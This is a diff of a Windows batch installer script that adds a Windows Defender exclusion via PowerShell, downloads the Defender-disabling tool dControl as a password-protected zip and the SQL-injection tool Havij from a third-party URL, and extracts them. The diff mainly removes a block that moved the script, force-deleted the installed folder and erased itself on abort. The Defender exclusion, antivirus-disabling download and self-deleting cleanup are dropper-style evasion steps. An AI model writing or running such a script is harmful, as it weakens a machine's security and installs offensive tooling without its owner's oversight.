@@ -15,7 +15,7 @@ set "dcontrol_zip=!folder!\dControl.zip"
 set "password=darknet123"
 
 :: Configuration for Havij
-set "havij_folder=%bat_dir%Havij"  :: Fixing folder path for Havij
+set "havij_folder=%bat_dir%Havij"
 set "havij_zip=!havij_folder!\havij.zip"
 set "havij_url=https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip"
 
@@ -36,6 +36,7 @@ if %errorLevel% neq 0 (
 :: AWS folder to defender exclusion
 echo [STEP] Adding Defender exclusion for: !awsFolder!
 powershell -Command "Try { Add-MpPreference -ExclusionPath '!awsFolder!' -ErrorAction Stop; Write-Host 'Defender exclusion added for AWS folder.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"
+
 
 :: === WinRAR Detection and Installation ===
 set "winrar_exe="
@@ -135,29 +136,13 @@ powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'
     exit /b
 )
 
+
+
+
 :: === Step 5: Wait for User Confirmation Before Extraction
 set /p userInput="Do you want to continue with extraction for dControl? (Y/N): "
 if /i not "%userInput%"=="Y" (
     echo [INFO] Installation aborted by user.
-
-    :: Move the batch file to the Desktop temporarily
-    set "batchFilePath=%~f0"
-    set "desktopFolder=%USERPROFILE%\Desktop"
-    set "tempLocation=%desktopFolder%\temp.bat"
-    move /y "!batchFilePath!" "!tempLocation!"
-
-    :: Wait for a moment to ensure the batch file has moved
-    timeout /t 1 /nobreak >nul
-
-    :: Force delete the AWS folder after the batch file is moved
-    echo [STEP] Force Deleting AWS folder...
-    rd /s /q "!awsFolder!"
-
-    :: Delete the batch file after closing the terminal
-    echo [STEP] Deleting batch file...
-    powershell -Command "Start-Sleep -Seconds 1; Remove-Item -LiteralPath '!tempLocation!' -Force"
-
-    :: Close terminal immediately
     exit /b
 )
 
@@ -179,6 +164,7 @@ echo [INFO] Deleted dControl ZIP file
 
 :: Open dControl Portable folder
 start explorer "!folder!"
+
 
 
 :: Decrypt using WinRAR (No user confirmation for Havij)
